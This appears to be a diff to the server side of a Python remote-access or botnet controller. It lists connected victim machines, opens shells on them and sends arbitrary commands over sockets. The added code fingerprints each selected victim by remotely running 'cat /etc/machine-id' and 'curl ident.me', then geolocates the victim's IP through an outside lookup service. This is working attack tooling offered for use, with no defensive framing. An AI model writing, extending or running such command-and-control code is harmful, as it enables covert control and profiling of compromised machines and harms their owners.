@@ -1,3 +1,5 @@
+import requests
+import json
 import os
 import socket
 import threading
@@ -48,7 +50,7 @@ def work():
             accept_connections()
         if x == 2:
             time.sleep(1)
-            client_connection()
+            command_menu()
             return
 
 def create_jobs():
@@ -92,24 +94,6 @@ def accept_connections():
         except:
             print("\n[!] Error accepting connections")
 
-def client_connection():
-    #queue.task_done()
-    while True:
-        cmd = input("\n[>] ")
-        match (cmd.lower()):
-            case "list":
-                list_connections()
-            case s if s.startswith("select"):
-                conn = get_target(cmd)
-                if conn is not None:
-                    get_target_commands(conn)
-            case "clear" | "cls":
-                os.system('clear')
-            case "shutdown":
-                source.shutdown()
-            case _:
-                print(f"\n[!] command not recognized: {cmd}")
-
 def list_connections():
     results = ""
     for i, conn in enumerate(CONNECTIONS):
@@ -121,7 +105,7 @@ def list_connections():
             del IP_ADDRESSES[i]
             continue
         results += f"+ {i}  {IP_ADDRESSES[i][0]}:{IP_ADDRESSES[i][1]} \n "
-    print(f'[*] ----- clients ---- \n\n {results}\n')
+    print(f'[*] ----- clients ----- \n\n {results}\n')
     return results
 
 def get_target(cmd):
@@ -132,7 +116,7 @@ def get_target(cmd):
         print(f"\n[*] connected to {IP_ADDRESSES[target][0]}")
         print(f"{IP_ADDRESSES[target][0]} $ ", end="")
         return conn
-    except:
+    except Exception:
         print(f"\n[!] {target} is not a valid selection")
         return None
 
@@ -152,16 +136,54 @@ def send_target_commands(cmd, conn):
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8")
+
             return client_response
     except Exception:
         print("\n[!] Connection to client was lost")
         return
 
-def get_hwid(conn):
+def target_info(conn):
     try:
         conn.send(str.encode('cat /etc/machine-id'))
         client_hwid = str(conn.recv(1024), "utf-8")
         hwid = client_hwid.split(maxsplit=1)[0]
-        return hwid
+
+        conn.send(str.encode('curl ident.me'))
+        client_ipaddr = str(conn.recv(1024), "utf-8")
+        client_ip = client_ipaddr.split(maxsplit=1)[0]
+
+        return hwid, client_ip
     except socket.error as e:
         print(f"\n[!] Connection to client was lost {e}")
+
+def parse_target_ip(target_ip):
+    try:
+        r = requests.get(f"https://dazzlepod.com/ip/{target_ip}.json")
+        target_ip_info = json.dumps(r.json(), indent =4, sort_keys=False)
+        return target_ip_info
+    except requests.ConnectionError as e:
+        print(f'\n[!] Connection error parsing target ip info')
+
+
+def command_menu():
+    #queue.task_done()
+    while True:
+        cmd = input("\n[>] ")
+        match (cmd.lower()):
+            case "list":
+                list_connections()
+            case s if s.startswith("select"):
+                conn = get_target(cmd)
+                hwid, target_ip = target_info(conn)
+                target_ip_info = parse_target_ip(target_ip)
+                print(f"\n[+] hwid: {hwid}\n[+] ip info:\n{target_ip_info}\n[$] ")
+                if conn is not None:
+                    pass
+            case "shell" | "sh":
+                    get_target_commands(conn) 
+            case "clear" | "cls":
+                os.system('clear')
+            case "shutdown":
+                source.shutdown()
+            case _:
+                print(f"\n[!] command not recognized: {cmd}")
